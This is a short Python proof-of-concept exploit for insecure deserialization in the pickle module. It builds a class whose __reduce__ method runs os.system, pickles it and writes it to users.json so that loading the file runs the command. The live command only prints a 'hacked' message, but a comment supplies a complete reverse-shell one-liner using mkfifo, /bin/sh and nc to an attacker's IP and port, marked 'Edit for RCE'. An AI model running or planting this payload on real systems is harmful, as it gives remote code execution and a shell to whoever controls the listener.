#!/usr/bin/python3
"""
This exploit uses the vulnerability of Insecure Deserialization in python module "pickle" to 
perform Code Execution.

"""
import os
import pickle


class Code_execution:
    def __reduce__(self):
        # For RCE: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your IP> <Port> > /tmp/f
        cmd = 'echo "You have been Hacked!"'  # Edit for RCE
        return os.system, (cmd,)


def fun():
    """
    Writes the pickled code to users.json file.
    """
    data = pickle.dumps(Code_execution())
    with open("users.json", "wb") as f:
        f.write(data)
    return data


if __name__ == '__main__':
    fun()
